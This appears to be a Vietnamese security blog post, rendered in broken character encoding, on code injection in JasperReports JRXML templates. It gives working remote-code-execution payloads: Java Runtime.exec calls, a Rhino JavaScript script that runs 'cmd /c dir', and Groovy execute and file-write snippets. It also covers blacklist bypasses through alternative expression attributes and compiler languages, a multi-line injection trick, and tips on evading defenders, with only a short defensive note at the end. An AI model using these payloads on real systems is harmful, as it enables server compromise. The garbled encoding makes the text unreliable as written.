trÃºc sang vÄƒn báº£n bÃ¡o cÃ¡o, cÃ³ thá»ƒ xuáº¥t ra vá»›i nhiá»u Ä‘á»‹nh dáº¡ng khÃ¡c nhau nhÆ°: PDF, HTML, Excel,\u0026hellip; Jasper há»— trá»£ nhiá»u file Ä‘áº§u vÃ o:\nJRXML: file XML vá»›i cÃ¡c attribute cá»§a jasper JASPER: file Ä‘Æ°á»£c compile tá»« jrxml CSV, JSON, XML,\u0026hellip; Trong pháº¡m vi bÃ i viáº¿t, mÃ¬nh sáº½ Ä‘á» cáº­p Ä‘áº¿n chá»©c nÄƒng phá»• biáº¿n khi sá»­ dá»¥ng thÆ° viá»‡n JasperReports mÃ  mÃ¬nh hay gáº·p nháº¥t, Ä‘Ã³ lÃ  chuyá»ƒn Ä‘á»•i file JRXML sang Ä‘á»‹nh dáº¡ng PDF.\nCáº¥u trÃºc file JRXML NhÆ° mÃ¬nh Ä‘Ã£ nÃ³i á»Ÿ trÃªn, file JRXML cÆ¡ báº£n lÃ  má»™t file XML nhÆ°ng cÃ¡c attribute sáº½ tuÃ¢n theo tiÃªu chuáº©n cá»§a má»™t Jasper Template, nÃªn ta cÅ©ng sáº½ cÃ³ tag \u0026lt;?xml\u0026gt; nhÆ° bao file XML khÃ¡c. Tháº» root cá»§a má»™t file JRXML sáº½ lÃ  \u0026lt;jasperReport\u0026gt;, trong tháº» Ä‘Ã³ ta sáº½ khai bÃ¡o nhá»¯ng thuá»™c tÃ­nh cÆ¡ báº£n cá»§a report nhÆ° in dá»c hay ngang, ngÃ´n ngá»¯ sá»­ dá»¥ng, tÃªn bÃ¡o cÃ¡o, Ä‘á»“ng thá»i cÃ³ thÃªm má»™t vÃ i XSD references. NhÆ°ng vá» cÆ¡ báº£n thÃ¬ ta chá»‰ cáº§n thuá»™c tÃ­nh name lÃ  Ä‘á»§, cÃ¡c thuá»™c tÃ­nh cÃ²n láº¡i lÃ  tÃ¹y chá»n, cÃ³ thá»ƒ cÃ³ cÅ©ng cÃ³ thá»ƒ khÃ´ng. BÃªn trong tháº» root, ta cÃ³ thá»ƒ chÃ¨n vÃ o cÃ¡c tháº» khÃ¡c nhau Ä‘á»ƒ biá»ƒu Ä‘áº¡t ná»™i dung cá»§a bÃ¡o cÃ¡o, tá»« cÃ¡c label hoáº·c chá»¯ cá»‘ Ä‘á»‹nh Ä‘áº¿n cÃ¡c biáº¿n cÃ³ giÃ¡ trá»‹ thay Ä‘á»•i, cÅ©ng nhÆ° cÃ³ thá»ƒ chÃ¨n vÃ o hÃ¬nh áº£nh, format báº£ng, chá»©c nÄƒng tÃ­nh toÃ¡n,\u0026hellip; Má»™t file JRXML in ra chá»¯ Hello World Ä‘áº¡i khÃ¡i sáº½ nhÆ° nÃ y:\n1 2 3 4 5 6 7 8 9 10 11 12 13 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;jasperReport name=\u0026#34;hello\u0026#34;\u0026gt; \u0026lt;detail\u0026gt; \u0026lt;band height=\u0026#34;50\u0026#34;\u0026gt; \u0026lt;staticText\u0026gt; \u0026lt;reportElement x=\u0026#34;200\u0026#34; y=\u0026#34;10\u0026#34; width=\u0026#34;200\u0026#34; height=\u0026#34;30\u0026#34;/\u0026gt; \u0026lt;textElement textAlignment=\u0026#34;Center\u0026#34;\u0026gt; \u0026lt;/textElement\u0026gt; \u0026lt;text\u0026gt;\u0026lt;![CDATA[Hello World]]\u0026gt;\u0026lt;/text\u0026gt; \u0026lt;/staticText\u0026gt; \u0026lt;/band\u0026gt; \u0026lt;/detail\u0026gt; \u0026lt;/jasperReport\u0026gt; Chi tiáº¿t vá» cÃ¡c attribute sá»­ dá»¥ng trong JasperReport cÃ¡c báº¡n cÃ³ thá»ƒ tham kháº£o táº¡i Jasper document . Thay vÃ o Ä‘Ã³, mÃ¬nh sáº½ Ä‘i vÃ o tÃ­nh nÄƒng khiáº¿n cho Jasper trá»Ÿ thÃ nh cÃ´ng cá»¥ render report máº¡nh máº½, Ä‘Ã³ lÃ  Expressions.\nExpressions Kiáº¿n thá»©c ná»n táº£ng LÃ  má»™t tÃ­nh nÄƒng máº¡nh máº½ Jasper cung cáº¥p cho ngÆ°á»i dÃ¹ng, cÃ¡c expression (cÃ³ thá»ƒ dá»‹ch ra lÃ  cÃ¡c biá»ƒu thá»©c, cÃ¡c mÃ´ táº£) Ä‘Æ°á»£c sá»­ dá»¥ng Ä‘á»ƒ khai bÃ¡o biáº¿n trong bÃ¡o cÃ¡o, cÅ©ng nhÆ° há»— trá»£ xá»­ lÃ½ cÃ¡c biáº¿n Ä‘Ã³ má»™t cÃ¡ch linh hoáº¡t tá»« hiá»ƒn thá»‹ cho Ä‘áº¿n tÃ­nh toÃ¡n. Äá»ƒ lÃ m Ä‘Æ°á»£c Ä‘iá»u Ä‘Ã³, cÃ¡c expression sáº½ Ä‘Æ°á»£c viáº¿t báº±ng ngÃ´n ngá»¯ láº­p trÃ¬nh, mÃ  máº·c Ä‘á»‹nh trong Jasper sáº½ lÃ  Java code. Vá»«a lÃ  tÃ­nh nÄƒng cÃ³ thá»ƒ giÃºp viá»‡c xá»­ lÃ½ dá»¯ liá»‡u in ra trÃªn bÃ¡o cÃ¡o Ä‘Æ°á»£c trá»±c quan vÃ  dá»… dÃ ng, nhÆ°ng cÅ©ng vá»«a lÃ  nÆ¡i Ä‘á»ƒ chÃ¨n code tÃ¹y Ã½. Tuy nhiÃªn cÃ³ má»™t lÆ°u Ã½ ráº±ng code truyá»n vÃ o bÃªn trong cÃ¡c expression cáº§n pháº£i tráº£ vá» má»™t kiá»ƒu dá»¯ liá»‡u nháº¥t Ä‘á»‹nh Ä‘á»ƒ hoáº¡t Ä‘á»™ng, náº¿u khÃ´ng sáº½ gÃ¢y lá»—i khi render. CÃ¡c expression nÃ y sáº½ Ä‘Æ°á»£c trigger trong quÃ¡ trÃ¬nh render file JRXML sang PDF. Náº¿u khÃ´ng cÃ³ cÆ¡ cháº¿ phÃ²ng thá»§ phÃ¹ há»£p, mÃ¬nh hoÃ n toÃ n cÃ³ thá»ƒ khai thÃ¡c lá»—i code injection Ä‘á»ƒ RCE, Ä‘á»c táº£i file,\u0026hellip;\nVÃ­ dá»¥ Äá»ƒ vÃ­ dá»¥ thÃªm trá»±c quan, mÃ¬nh cÃ³ má»™t Ä‘oáº¡n code spring Ä‘Æ¡n giáº£n, phá»¥c vá»¥ viá»‡c upload 1 file JRXML vÃ  tráº£ vá» file report.pdf MÃ¬nh sá»­ dá»¥ng Jasper phiÃªn báº£n 6.21.4 lÃ  ver má»›i nháº¥t cá»§a dÃ²ng 6., vÃ¬ mÃ¬nh tháº¥y dÃ²ng 6. hiá»‡n Ä‘ang Ä‘Æ°á»£c sá»­ dá»¥ng nhiá»u nháº¥t. Sá»­ dá»¥ng luÃ´n vÃ­ dá»¥ bÃªn trÃªn, thay vÃ¬ sá»­ dá»¥ng tháº» \u0026lt;text\u0026gt; Ä‘á»ƒ hiá»ƒn thá»‹ ná»™i dung tÄ©nh trong field \u0026lt;staticText\u0026gt;, mÃ¬nh sáº½ sá»­ dá»¥ng tháº» \u0026lt;textFieldExpression\u0026gt; dÃ¹ng Ä‘á»ƒ diá»…n Ä‘áº¡t ná»™i dung bÃªn trong tháº» \u0026lt;textField\u0026gt;, Ä‘áº¡i khÃ¡i lÃºc nÃ y file JRXML sáº½ nhÆ° sau:\n1 2 3 4 5 6 7 8 9 10 11 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;jasperReport name=\u0026#34;1337\u0026#34;\u0026gt; \u0026lt;detail\u0026gt; \u0026lt;band height=\u0026#34;50\u0026#34;\u0026gt; \u0026lt;textField\u0026gt; \u0026lt;reportElement x=\u0026#34;200\u0026#34; y=\u0026#34;10\u0026#34; width=\u0026#34;200\u0026#34; height=\u0026#34;30\u0026#34;/\u0026gt; \u0026lt;textFieldExpression\u0026gt;\u0026lt;![CDATA[new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\u0026#34;whoami\u0026#34;).getInputStream())).readLine()]]\u0026gt;\u0026lt;/textFieldExpression\u0026gt; \u0026lt;/textField\u0026gt; \u0026lt;/band\u0026gt; \u0026lt;/detail\u0026gt; \u0026lt;/jasperReport\u0026gt; Táº£i file PDF vá» vÃ  output cÃ¢u lá»‡nh sáº½ hiá»ƒn thá»‹ ra ngoÃ i: NgoÃ i cÃ¡ch táº¥n cÃ´ng nÃ y ra thÃ¬ má»™t sá»‘ bÃ i viáº¿t trÃªn máº¡ng thÃ¬ Ä‘a sá»‘ há» sáº½ táº¥n cÃ´ng vÃ o tháº» \u0026lt;variableExpression\u0026gt; trong quÃ¡ trÃ¬nh khai bÃ¡o biáº¿n \u0026lt;variable\u0026gt;, nÃªn mÃ¬nh sáº½ khÃ´ng nháº¯c Ä‘áº¿n nÃ³ ná»¯a, mÃ¬nh sáº½ Ä‘á»ƒ chÃºng á»Ÿ trong pháº§n ref Ä‘á»ƒ cÃ¡c báº¡n cÃ³ thá»ƒ tham kháº£o thÃªm.\nBypasses Giáº£ sá»­ nhÆ° dev giá» Ä‘Ã£ biáº¿t Ä‘Æ°á»£c táº§m nghiÃªm trá»ng cá»§a váº¥n Ä‘á» vÃ  cÃ³ má»™t sá»‘ biá»‡n phÃ¡p phÃ²ng thá»§, mÃ¬nh sáº½ Ä‘Æ°a ra má»™t sá»‘ phÆ°Æ¡ng phÃ¡p cÃ³ thá»ƒ bypass cÆ¡ cháº¿ phÃ²ng thá»§ nhÆ° sau:\nExpression Attribute HÆ°á»›ng Ä‘áº§u tiÃªn mÃ  mÃ¬nh nghÄ© Ä‘áº¿n trong cÃ¡c trick bypass Ä‘Ã³ lÃ  sá»­ dá»¥ng cÃ¡c tháº» khÃ¡c ngoÃ i nhá»¯ng tháº» Ä‘Ã£ cÃ³ sáºµn payload trÃªn máº¡ng. JasperReports cÃ³ kha khÃ¡ cÃ¡c expression khÃ¡c mÃ  mÃ¬nh cÃ³ thá»ƒ lá»£i dá»¥ng, vÃ¬ báº£n thÃ¢n trÆ°á»ng dá»¯ liá»‡u nÃ o cÅ©ng cáº§n cÃ³ nhu cáº§u hiá»ƒn thá»‹ vÃ  xá»­ lÃ½ dá»¯ liá»‡u linh hoáº¡t. Ta cÃ³ thá»ƒ sá»­ dá»¥ng attribute defaultValueExpression bÃªn trong tháº» \u0026lt;parameter\u0026gt;, rá»“i call táº¡i tháº» textField quen thuá»™c. Äá»ƒ call Ä‘áº¿n param, trong textFieldExpression mÃ¬nh sáº½ sá»­ dá»¥ng cÃº phÃ¡p $P{TÃªn param}: Táº¡i tháº» variable thÃ¬ cÃ²n má»™t expression ná»¯a ngoÃ i variableExpression lÃ  initialValueExpression cÅ©ng cÃ³ thá»ƒ chÃ¨n code, call Ä‘áº¿n variable thÃ´ng qua syntax $V{TÃªn variable}: Má»™t lÆ°u Ã½ nhá» lÃ  Ä‘á»ƒ in ra giÃ¡ trá»‹ variable thÃ¬ textfield sáº½ Ä‘Æ°á»£c khai bÃ¡o bÃªn trong tháº» \u0026lt;title\u0026gt;, náº¿u sá»­ dá»¥ng \u0026lt;detail\u0026gt; sáº½ luÃ´n hiá»ƒn thá»‹ giÃ¡ trá»‹ null MÃ² máº«m document, mÃ¬nh tháº¥y náº¿u nhÆ° khÃ´ng nháº¥t thiáº¿t pháº£i láº¥y output cá»§a cÃ¢u lá»‡nh thÃ¬ tá»“n táº¡i má»™t sá»‘ Expression Ä‘áº·c thÃ¹ cÃ³ thá»ƒ lá»£i dá»¥ng Ä‘á»ƒ RCE, nhÆ°ng nÃ³ sáº½ gÃ¢y ra lá»—i. Attribute imageExpression thuá»™c tháº» \u0026lt;image\u0026gt; vá»‘n Ä‘Æ°á»£c sá»­ dá»¥ng Ä‘á»ƒ Jasper cÃ³ thá»ƒ láº¥y áº£nh tá»« má»™t URL xÃ¡c Ä‘á»‹nh dáº¡ng String, khi khÃ´ng Ä‘Ã¡p á»©ng Ä‘Ãºng dá»¯ liá»‡u yÃªu cáº§u, cÃ¢u lá»‡nh sáº½ tráº£ vá» lá»—i nÃªn mÃ¬nh váº«n cÃ³ thá»ƒ lá»£i dá»¥ng Ä‘á»ƒ thá»±c hiá»‡n cÃ¡c cÃ¢u lá»‡nh blind Ä‘á»ƒ confirm. Táº¡i Ä‘Ã¢y vÃ¬ mÃ¬nh truyá»n vÃ o Runtime.getRuntime().exec(), output tráº£ vá» sáº½ lÃ  má»™t object thuá»™c ProcessImpl nÃªn chÆ°Æ¡ng trÃ¬nh sáº½ vÄƒng ra lá»—i nhÆ° sau: Náº¿u nhÆ° set up Ä‘á»ƒ cÃ¢u lá»‡nh tráº£ vá» dá»¯ liá»‡u, Jasper khi cá»‘ gáº¯ng truy cáº­p URL Ä‘á»ƒ láº¥y byte áº£nh vá» tháº¥t báº¡i cÅ©ng sáº½ vÄƒng ra lá»—i, tuy nhiÃªn mÃ¬nh tháº¥y extract thÃ´ng tin 1 dÃ²ng thÃ¬ cÃ³ váº» khÃ´ng giÃ²n láº¯m: Tiáº¿p Ä‘áº¿n lÃ  attribute printWhenExpression cÃ³ thá»ƒ Ä‘Æ°á»£c khai bÃ¡o trong tháº» \u0026lt;band\u0026gt; hoáº·c \u0026lt;reportElement\u0026gt;, sá»­ dá»¥ng khi ta chá»‰ muá»‘n dá»¯ liá»‡u Ä‘Æ°á»£c in ra theo má»™t Ä‘iá»u kiá»‡n nháº¥t Ä‘á»‹nh, nÃªn nÃ³ yÃªu cáº§u cáº§n tráº£ vá» giÃ¡ trá»‹ kiá»ƒu Boolean hoáº·c giÃ¡ trá»‹ null. Viá»‡c truyá»n java code vÃ o attribute nÃ y cÅ©ng sáº½ gÃ¢y lá»—i lÃºc render PDF nÃªn ta Æ°u tiÃªn báº±ng má»™t sá»‘ cÃ¢u lá»‡nh blind nhÆ° curl, ping,\u0026hellip; Attribute conditionExpression thuá»™c tháº» \u0026lt;style\u0026gt; -\u0026gt; \u0026lt;conditionalStyle\u0026gt; cÃ³ tÃ¡c dá»¥ng mÃ´ táº£ Ä‘iá»u kiá»‡n Ä‘á»ƒ Ã¡p dá»¥ng má»™t style cho dá»¯ liá»‡u cá»¥ thá»ƒ, cÅ©ng yÃªu cáº§u dá»¯ liá»‡u tráº£ vá» Boolean. Äá»ƒ trigger Ä‘Æ°á»£c Ä‘iá»u kiá»‡n nÃ y, ta cáº§n má»™t element trong file JRXML Ã¡p dá»¥ng style Ä‘Ã£ inject, táº¡i Ä‘Ã¢y mÃ¬nh PoC vá»›i tháº» textField cho tiá»‡n: Náº¿u nhÆ° ta muá»‘n thay Ä‘á»•i cÃ¡ch hiá»ƒn thá»‹ cá»§a má»™t vÃ¹ng dá»¯ liá»‡u, ta cÃ³ thá»ƒ sá»­ dá»¥ng propertyExpression Ä‘á»ƒ mÃ´ táº£ Ä‘iá»u kiá»‡n cÅ©ng nhÆ° quy Ä‘á»‹nh cÃ¡ch biáº¿n Ä‘á»•i. Äá»“ng thá»i cÅ©ng lÃ  má»™t nÆ¡i Ä‘á»ƒ chÃ¨n code. Tuy tráº£ vá» kiá»ƒu String, expression nÃ y khÃ´ng pháº£i lÃ  má»™t giÃ¡ trá»‹ hiá»ƒn thá»‹ mÃ  chá»‰ cÃ³ thá»ƒ thiáº¿t láº­p thuá»™c tÃ­nh cho giÃ¡ trá»‹ Ä‘Ã³. Khi sá»­ dá»¥ng mÃ¬nh váº«n nÃªn Æ°u tiÃªn cÃ¡c cÃ¢u lá»‡nh out bound Ä‘á»ƒ confirm bug sáº½ tá»‘t hÆ¡n: NgoÃ i nhá»¯ng expression mÃ¬nh Ä‘Ã£ liá»‡t kÃª cÃ¡ch khai thÃ¡c á»Ÿ bÃªn trÃªn, váº«n cÃ²n nhiá»u cÃ¡c expression khÃ¡c nhÆ°: dataSourceExpression, filterExpression, anchorNameExpression,\u0026hellip; Má»—i loáº¡i sáº½ Ä‘Æ°á»£c trigger trong má»™t tháº» vÃ  dÆ°á»›i Ä‘iá»u kiá»‡n cá»¥ thá»ƒ, cÃ¡c báº¡n cÃ³ thá»ƒ tÃ¹y vÃ o luá»“ng nghiá»‡p vá»¥ cá»§a bÃ¡o cÃ¡o Ä‘á»ƒ Ä‘a dáº¡ng hÃ³a nÆ¡i chÃ¨n code, bypass cÃ¡c blacklist náº¿u cÃ³.\nJasper compiler Trong má»™t file JRXML, cÃ³ má»™t thuá»™c tÃ­nh cá»§a tháº» root mÃ  mÃ¬nh chÆ°a Ä‘á» cáº­p Ä‘áº¿n á»Ÿ bÃªn trÃªn, nÃ³ lÃ  language - tá»©c ngÃ´n ngá»¯ xá»­ lÃ½ cÃ¡c expression xuáº¥t hiá»‡n trong JasperReports. Náº¿u khÃ´ng Ä‘Æ°á»£c khai bÃ¡o thÃ¬ ngÃ´n ngá»¯ máº·c Ä‘á»‹nh sáº½ lÃ  Java (cÅ©ng lÃ  ngÃ´n ngá»¯ mÃ  mÃ¬nh sá»­ dá»¥ng demo á»Ÿ nhá»¯ng pháº§n trÃªn). Tuy nhiÃªn, Jasper há»— trá»£ xá»­ lÃ½ thÃªm 3 loáº¡i ngÃ´n ngá»¯ khÃ¡c, khi Ä‘Æ°á»£c khai bÃ¡o trong language thÃ¬ chÃºng sáº½ Ä‘Æ°á»£c xá»­ lÃ½ vá»›i compiler tÆ°Æ¡ng á»©ng, Ä‘Ã³ lÃ :\nGroovy: JRGroovyCompiler Javascript: JavaScriptCompiler BeanShell: JRBshCompiler (ÄÃ£ khÃ´ng cÃ²n há»— trá»£ tá»« Jasper 6.6.0 nÃªn trong pháº¡m vi bÃ i viáº¿t mÃ¬nh sáº½ khÃ´ng Ä‘á» cáº­p Ä‘áº¿n ná»¯a) Äiá»u kiá»‡n Ä‘á»ƒ Jasper compile Ä‘Æ°á»£c cÃ¡c ngÃ´n ngá»¯ nÃ y lÃ  há»‡ thá»‘ng cáº§n cÃ³ lib Ä‘á»ƒ xá»­ lÃ½ ngÃ´n ngá»¯ Ä‘Ã³ tÆ°Æ¡ng á»©ng. Vá»›i groovy thÃ¬ sáº½ cáº§n lib: org.apache.groovy -\u0026gt; groovy-all, cÃ²n vá»›i javascript ta sáº½ import thÃªm lib: org.mozilla -\u0026gt; rhino. Cá»¥ thá»ƒ thÃ¬ mÃ¬nh sá»­ dá»¥ng version sau:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 \u0026lt;!-- https://mvnrepository.com/artifact/org.codehaus.groovy/groovy-all --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.codehaus.groovy\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;groovy-all\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.0.20\u0026lt;/version\u0026gt; \u0026lt;type\u0026gt;pom\u0026lt;/type\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!-- https://mvnrepository.com/artifact/org.mozilla/rhino --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.mozilla\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;rhino\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.7.14\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; Groovy Äá»ƒ Jasper sá»­ dá»¥ng groovy lÃ m ngÃ´n ngá»¯ biÃªn dá»‹ch code trong cÃ¡c expression, ta thÃªm property language=\u0026quot;groovy\u0026quot;, cÅ©ng nhÆ° há»‡ thá»‘ng cÃ³ chá»©a lib há»— trá»£ xá»­ lÃ½ Groovy. MÃ¬nh vÃ­ dá»¥ má»™t payload cháº¡y lá»‡nh notepad thÃ´ng qua method .execute() trong groovy: LÆ°u Ã½ lÃ  mÃ¬nh khÃ´ng sá»­ dá»¥ng Ä‘Æ°á»£c lá»‡nh println Ä‘á»ƒ in ra káº¿t quáº£ cÃ¢u lá»‡nh, cháº³ng háº¡n nhÆ°: println(\u0026quot;${\u0026quot;cmd /c ver\u0026quot;.execute().text}\u0026quot; sáº½ hiá»ƒn thá»‹ output cÃ¢u lá»‡nh táº¡i server console, cÃ²n táº¡i PDF ná»™i dung sáº½ lÃ  null: NgoÃ i viá»‡c thá»±c hiá»‡n lá»‡nh, mÃ¬nh cÅ©ng cÃ³ thá»ƒ ghi file náº¿u nhÆ° biáº¿t Ä‘Æ°á»ng dáº«n báº±ng newFile(\u0026quot;path/to/shell\u0026quot;).write('1337'), hoáº·c nhiá»u cÃ¡c tÃ¡c vá»¥ file khÃ¡c. MÃ¬nh nghÄ© nÃªn dÃ¹ng cÃ¡c native syntax code cá»§a tá»«ng ngÃ´n ngá»¯ thay vÃ¬ thá»±c thi cÃ¢u lá»‡nh Ä‘á»ƒ trÃ¡nh viá»‡c bá»‹ bÃªn blue phÃ¡t hiá»‡n sá»›m (náº¿u cÃ³).\nJavascript Báº£n thÃ¢n javascript khÃ´ng cÃ³ native syntax Ä‘á»ƒ execute command, nÃªn mÃ¬nh sáº½ lá»£i dá»¥ng kháº£ nÄƒng gá»i Java trong javascript Ä‘á»ƒ call cÃ¡c package thÃ´ng qua syntax Packages, cÃ¡i nÃ y khÃ¡ há»¯u Ã­ch khi bÃªn há» cháº·n theo kiá»ƒu blacklist 1 chuá»—i method Runtime.getRuntime().exec() hoáº·c tÆ°Æ¡ng tá»±. LÆ°u Ã½ lÃ  má»™t textField sáº½ chá»‰ cÃ³ thá»ƒ in ra ná»™i dung trÃªn 1 dÃ²ng nÃªn háº§u háº¿t nhá»¯ng cÃ¢u lá»‡nh trÃªn mÃ¬nh hay demo báº±ng whoami, Ä‘á»ƒ láº¥y Ä‘Æ°á»£c nhiá»u input hÆ¡n, mÃ¬nh sáº½ sá»­ dá»¥ng thÃªm attribute isStretchWithOverflow=\u0026quot;true\u0026quot; Ä‘á»ƒ Jasper tá»± Ä‘á»™ng kÃ©o dÃ i textField cho mÃ¬nh, náº¿u khÃ´ng cÃ³ attribute Ä‘Ã³ Jasper chá»‰ in ra 1 dÃ²ng Ä‘áº§u tiÃªn cá»§a output command. Náº¿u sá»­ dá»¥ng javascript ta cÃ³ thá»ƒ thoáº£i mÃ¡i sá»­ dá»¥ng ; Ä‘á»ƒ chÃ¨n nhiá»u cÃ¢u lá»‡nh, mÃ¬nh vÃ­ dá»¥ má»™t Ä‘oáº¡n code ngáº¯n Ä‘á»ƒ láº¥y háº¿t output cÃ¢u lá»‡nh dir:\n1 2 3 4 5 6 7 8 9 10 11 12 var r = Packages.java.lang.Runtime; var p = r.getRuntime().exec(\u0026#34;cmd /c dir\u0026#34;); var i = Packages.java.io.InputStreamReader(p.getInputStream()); var b = Packages.java.io.BufferedReader(i); var line; var output = \u0026#34;\u0026#34;; while ((line = b.readLine()) !== null) { output += line + \u0026#34;\\n\u0026#34;; } b.close(); p.waitFor(); output; Táº¡i PDF mÃ¬nh Ä‘Ã£ cÃ³ thá»ƒ láº¥y háº¿t Ä‘c output cÃ¢u lá»‡nh: Multi-line Code Injection Náº¿u nhÆ° cÃ¡c báº¡n Ä‘á»ƒ Ã½ thÃ¬ khi chÃ¨n Java vÃ  Groovy code thÃ¬ háº§u nhÆ° mÃ¬nh luÃ´n Æ°u tiÃªn dÃ¹ng one-line code, bá»Ÿi vÃ¬ Ä‘Ã´i khi sá»­ dá»¥ng dáº¥u ; thÃ¬ sáº½ xáº£y ra lá»—i thá»±c thi, lÃºc trÆ°á»›c mÃ¬nh chÆ°a hiá»ƒu táº¡i sao nÃªn cÅ©ng táº¡m thá»i bá» qua mÃ  sá»­ dá»¥ng one-line code. Tuy nhiÃªn, viá»‡c chÃ¨n nhiá»u hÆ¡n 1 cÃ¢u lá»‡nh sáº½ cáº§n thiáº¿t náº¿u nhÆ° ta muá»‘n sá»­ dá»¥ng native code Ä‘á»ƒ thá»±c hiá»‡n reverse shell, download file, upload file,\u0026hellip; thay vÃ¬ cháº¡y lá»‡nh há»‡ thá»‘ng. NÃªn mÃ¬nh cÅ©ng ngá»“i mÃ y mÃ² debug Ä‘á»ƒ náº¯m rÃµ váº¥n Ä‘á».\nJava MÃ¬nh sáº½ truyá»n vÃ o 1337;;; táº¡i textFieldExpression Ä‘á»ƒ thá»­ Ä‘Ã£. Vá»›i cáº£ 2 ngÃ´n ngá»¯, viá»‡c expression Ä‘Æ°á»£c biáº¿n thÃ nh source code nhÆ° tháº¿ nÃ o nÃ o sáº½ náº±m táº¡i method compileReport, mÃ¬nh Ä‘áº·t breakpoint tá»« nÃ³ Ä‘á»ƒ debug: Tá»« JasperCompileManager#compileReport, Jasper kiá»ƒm tra ngÃ´n ngá»¯ Ä‘á»ƒ chá»n Ä‘Ãºng Compiler cho report. VÃ¬ Ä‘Ã¢y lÃ  Java nÃªn Jasper sáº½ sá»­ dá»¥ng JRJdtCompiler#generateSourceCode Tiáº¿p tá»¥c call Ä‘áº¿n JRClassGenerator#generateClass, cÃ¡c method vÃ  param sáº½ Ä‘Æ°á»£c thiáº¿t láº­p táº¡i Ä‘Ã¢y báº±ng má»™t loáº¡t cÃ¡c method generate: Nháº£y vÃ o JRClassGenerator#generateMethod, mÃ¬nh Ä‘Ã£ tháº¥y nÆ¡i xá»­ lÃ½ code cÃ³ trong expression, Ä‘Ã³ lÃ  thÃ´ng qua method JRClassGenerator#writeExpression CÃ¢u lá»‡nh cá»§a mÃ¬nh Ä‘Æ°á»£c Ä‘Æ°a vÃ o lá»‡nh case, vá»›i sá»‘ case Ä‘Æ°á»£c láº¥y tá»« expression Id, cÃ²n giÃ¡ trá»‹ thÃ¬ ná»‘i chuá»—i vá»›i Ä‘oáº¡n code value = ..., sau Ä‘Ã³ break ra ngoÃ i Náº¿u váº­y thÃ¬ vá»›i Java Ä‘á»ƒ chÃ¨n thÃªm code mÃ¬nh nghÄ© khÃ¡ Ä‘Æ¡n giáº£n, chá»‰ cáº§n Ä‘Æ°a cho value má»™t chuá»—i ban Ä‘áº§u rá»“i xuá»‘ng dÃ²ng viáº¿t tiáº¿p lá»‡nh lÃ  Ä‘Æ°á»£c: Groovy Tuy nhiÃªn khi sá»­ dá»¥ng cÃ¡ch Ä‘Ã³ vá»›i groovy thÃ¬ khÃ´ng thÃ nh cÃ´ng: Äiá»ƒm khÃ¡c biá»‡t náº±m táº¡i JRGroovyGenerator#writeExpression, lÃºc nÃ y code Ä‘Æ°á»£c Ä‘Æ°a vÃ o value = ( vÃ  Ä‘á»“ng thá»i cÃ³ má»™t dáº¥u ); káº¿t thÃºc trong cÃ¢u lá»‡nh if, cÃ¢u lá»‡nh bá»‹ lá»—i do mÃ¬nh chÆ°a Ä‘Ã³ng ngoáº·c value láº¡i: Äá»ƒ cháº¡y Ä‘Æ°á»£c multi-line á»Ÿ groovy, mÃ¬nh cáº§n thÃªm ); sau chuá»—i, Ä‘á»“ng thá»i comment láº¡i dáº¥u ); Ä‘áº±ng sau Ä‘á»ƒ khÃ´ng trigger lá»—i syntax: =\u0026gt; Khi sá»­ dá»¥ng multi-line code táº¡i Java vÃ  Groovy, ta Ä‘Ã£ ngáº¯t cÃ¢u lá»‡nh value tá»©c giÃ¡ trá»‹ tráº£ vá» cá»§a textFeild lÃ  chuá»—i táº¡i dÃ²ng Ä‘áº§u tiÃªn, nÃªn Ä‘á»ƒ láº¥y Ä‘Æ°á»£c output, mÃ¬nh sáº½ cáº§n pháº£i set láº¡i giÃ¡ trá»‹ cho biáº¿n value bÃªn trÃªn. VÃ­ dá»¥ táº¡i Java, mÃ¬nh sáº½ gÃ¡n láº¡i giÃ¡ trá»‹ cho value báº±ng output cÃ¢u lá»‡nh cmd /c ver: TÆ°Æ¡ng tá»± vá»›i Groovy, mÃ¬nh gÃ¡n láº¡i output cá»§a def cmd vÃ o lÃ  cÃ³ thá»ƒ láº¥y háº¿t output: Káº¿t luáº­n TÃ¹y vÃ o tÃ¬nh hÃ¬nh cá»¥ thá»ƒ cá»§a há»‡ thá»‘ng mÃ  mÃ¬nh sáº½ Ä‘Æ°a ra lá»±a chá»n nÃªn táº¥n cÃ´ng theo cÃ¡ch bypass nÃ o. CÅ©ng nhÆ° cÃ³ thá»ƒ káº¿t há»£p viá»‡c sá»­ dá»¥ng ngÃ´n ngá»¯ khÃ¡c vÃ  tháº» láº¡ Ä‘á»ƒ da dáº¡ng hÃ³a cÃ¡ch thá»©c táº¥n cÃ´ng, khiáº¿n cho viá»‡c truy váº¿t trá»Ÿ nÃªn khÃ³ khÄƒn hÆ¡n. MÃ¬nh mong bÃ i viáº¿t cá»§a mÃ¬nh sáº½ cung cáº¥p cho má»i ngÆ°á»i nhá»¯ng kiáº¿n thá»©c tá»•ng quan vá» Jasper, tá»« Ä‘Ã³ cÃ³ thá»ƒ tÃ¬m Ä‘Æ°á»£c thÃªm nhiá»u kiá»ƒu bypass khÃ¡c ná»¯a. Hiá»‡n táº¡i mÃ¬nh chÆ°a tháº¥y cÃ³ cÃ¡ch nÃ o Ä‘á»ƒ phÃ²ng trÃ¡nh triá»‡t Ä‘á»ƒ lá»—i nÃ y, nÃªn cÃ¡c developer khi sá»­ dá»¥ng JasperReports cáº§n chÃº Ã½ háº¡n cháº¿ tá»‘i Ä‘a cho ngÆ°á»i dÃ¹ng Ä‘Æ°á»£c chá»‰nh sá»­a cÃ¡c thÃ nh pháº§n trong template, chá»‰ sá»­ dá»¥ng khung template cÃ³ sáºµn.\nReferences https://jasperreports.sourceforge.net/JasperReports-Ultimate-Guide-3.pdf https://www.cnblogs.com/snad/p/17566075.html https://gist.github.com/v-p-b/dd95c72c6924dc1338e78e9d380bd388 https://insinuator.net/2023/06/jasper-reports-library-code-injection/ 